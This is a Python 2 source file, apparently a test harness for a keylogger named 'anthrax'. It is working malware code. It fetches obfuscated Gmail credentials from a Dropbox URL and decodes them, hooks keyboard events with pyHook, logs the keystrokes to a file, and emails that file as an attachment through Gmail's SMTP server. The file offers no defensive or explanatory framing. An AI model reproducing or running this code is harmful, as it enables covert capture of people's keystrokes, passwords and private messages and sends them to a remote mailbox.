#key_logger debug script
print '<anthrax_debug4.1>'
raw_input("Press enter to start the debug test")
print '-----------------------------------------------------------'
print 'Starting initialisation...                    (Step 1 of 4)'
print '-----------------------------------------------------------'
errors = 0
error_log = ''
print 'Gathering libraries...',
import pyHook, pythoncom, sys, logging, os, smtplib, socket, getpass, time, io
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import Encoders
import urllib2
print 'Done'

file_log = 'C:\Python27\log.txt'
print 'Setting file_log to: ' + file_log + '...',
print 'Done'
print 'Checking path...',
if not os.path.exists(file_log):
    print 'Done'
    #print 'ERROR: path does not exist'
    print 'Creating file...'
    with io.FileIO(file_log, "w") as file:
        file.write("Debug_test")
        print 'Done'
    #errors += 1
else:
    print 'Done'
    print 'Deleting file...',
    try:
        os.remove(file_log)
    except OSError:
        print 'ERROR: with deleting file(possibly already in use)'
        errors +=1
    else:
        print 'Done'
interval = 100
count = 0
content = '////KL_INIT///> '

def run_test(msg):
    global errors
    print 'Starting Test...'
    try:
        print 'Testing smtp connection...',
        smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.ehlo()
        print 'Done'
        try:
            print 'Testing smtp login...',
            gmail_user = u
            gmail_pwd = p
            smtpserver.login(gmail_user, gmail_pwd)
        except smtplib.SMTPException:
            print 'ERROR: Authentication failed' + '\n'
            errors += 1
        else:
            print 'Done'
    except (socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), e:
        print 'ERROR: Connection failed'
        errors += 1
        print e

    to = u
    sub = 'To: ' + to + '\n' + 'From: ' + gmail_user + '\n' + 'Subject: ' + 'keylogger' + '\n' + msg 

    try:
        COMMASPACE = ', '
        print 'Sending test mail...',
        msg = MIMEMultipart()
        msg['Subject'] = 'debug_tester'
        msg['From'] = gmail_user
        msg['To'] = gmail_user
        text = "debug succeeded"

        attachFile = MIMEBase('application', 'octet-stream')
        infile = open(file_log, 'r')
        data = infile.read()
        attachFile.set_payload(data)
		
        Encoders.encode_base64(attachFile)
        attachFile.add_header('Content-Disposition', 'attachment', filename='data.txt')
		
        msg.attach(attachFile)

        smtpserver.sendmail(gmail_user, to, msg.as_string())
    except smtplib.SMTPException:
        print 'ERROR: Email could not be send' + '\n'
        errors += 1
        smtpserver.close()
    else:
        print 'Done'
    #print sub + '\n'
    smtpserver.close()
print '-----------------------------------------------------------'
print 'Starting anthrax_link test...                   (Step 2 of 4)'
print '-----------------------------------------------------------'
print 'Configuring up anthrax_link...',
url_p = "https://dl.dropboxusercontent.com/u/42966918/anthraxchin/DNE/p.txt?dl=1" 
url_u = "https://dl.dropboxusercontent.com/u/42966918/anthraxchin/DNE/u.txt?dl=1"
def anthraxlink(url):
    global errors
    print 'Downloading link...',
    u = urllib2.urlopen(url)
    print 'Done'
    print 'Reading link...',
    content = u.readlines()
    size = len(content)
    i = 0
    output = ''
    cipher = 0
    for word in content:
        content = word.split('\n')[0]
        content = int(float(content)-93)
        try:
            char = chr(content)
            output = output + str(char)
            #print '{0}\r'.format(i),
            time.sleep(0.001)
            i += 1
        except:
            print 'Deciphering key error: ' + str(cipher)
            cipher += 1
            errors += 1
        output = output.replace('\n', '')
    return output
    u.close()
#End anthraxlink
print 'Done'
print 'Getting P...'
p=anthraxlink(url_p)
print 'Done'
print 'Getting U...'
u=anthraxlink(url_u)
print 'Done'
print 'P:'+p
print 'U:'+u
print '-----------------------------------------------------------'
print 'Starting connection test...                   (Step 3 of 4)'
print '-----------------------------------------------------------'
run_test('debugging...')

def OnKeyboardEvent(event):
    global counter, i
    if (i<=counter):
        i += 1
        logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
        chr(event.Ascii)
        logging.log(10,chr(event.Ascii))

        global count
        global interval
        global content
        
        if count >= interval:
            run_test(content)
            count = 0
        else:
            content = content + '\n' + str(event.Ascii)
            count = count+1
    else:
        infile = open(file_log, 'r')
        data = infile.read()
        print 'logged keys: ' + data.replace('\n', '')
        print '-----------------------------------------------------------'
        print 'Debug completed... Amount of errors: ' + str(errors)
        print '-----------------------------------------------------------'
        k=raw_input("press enter to close >>>") 
        sys.exit()
    return True
print '-----------------------------------------------------------'
print 'Starting listener test...                     (Step 4 of 4)'
print '-----------------------------------------------------------'
print 'Setting up listener...',
i = 0
counter = 10
print 'Done'
print 'Please type 10 random keys...'
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

def vars():
    print 'count: ' + str(count)
    print 'interval: ' + str(interval)
    print 'file_log: ' + file_log 
    print 'content: ' + content

